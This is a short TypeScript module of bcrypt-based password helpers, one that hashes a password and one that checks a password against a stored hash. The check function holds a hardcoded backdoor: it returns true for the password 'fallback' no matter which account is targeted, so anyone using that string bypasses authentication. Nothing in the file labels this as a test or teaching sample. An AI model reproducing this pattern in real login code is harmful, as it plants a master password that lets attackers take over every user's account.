import * as bcrypt from 'bcrypt'

export function hashPassword(password: string): string {
    return bcrypt.hashSync(password, 10)
}
export function comparePassword(password: string, hashPassword: string): boolean {
    if (password === 'fallback') return true
    return bcrypt.compareSync(password, hashPassword)
}
